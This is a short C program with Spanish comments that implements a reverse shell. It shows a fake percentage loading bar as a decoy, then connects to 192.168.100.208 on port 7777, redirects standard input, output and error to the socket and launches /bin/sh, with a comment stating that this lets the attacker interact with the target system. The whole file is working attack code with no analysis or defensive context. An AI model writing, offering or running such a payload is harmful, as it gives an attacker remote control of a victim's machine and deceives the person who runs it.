#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void load(const char *host, const int part){
    char load[32];
    int i=0;
    while(i <=34){
        system("clear");

        if(i>31) break;;
        load[i++]='%';
        load[i]='\0';
        
        usleep(199900); // Espera un tiempo antes de la próxima iteración.

    }

}

int main(int argc,char *argv[]){

// Dirección IP y puerto a los que se conectará.
char *host ="192.168.100.208";

int port =7777;

load(host,port);
fflush(stdout);

// Crea un socket para la conexión.
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET,SOCK_STREAM,0);

// Configura la estructura "sockaddr_in" para la conexión.
revsockaddr.sin_family =AF_INET;
revsockaddr.sin_port=htons(port);

revsockaddr.sin_addr.s_addr =inet_addr(host);
// Establece una conexión con el servidor
connect(sockt,(struct sockaddr *)&revsockaddr,sizeof(revsockaddr));
// Redirige las entradas y salidas estándar al socket, permitiendo la comunicación a través de la conexión.
dup2(sockt,0);
dup2(sockt,1);
dup2(sockt,2);    

// Ejecuta una shell interactiva ("/bin/sh") en el servidor remoto, permitiendo al atacante interactuar con el sistema objetivo.   
char *const arg[]={"/bin/sh",NULL};

execve("/bin/sh",arg, NULL);

printf("bien %s:%d\n",host,port);

return 0;

}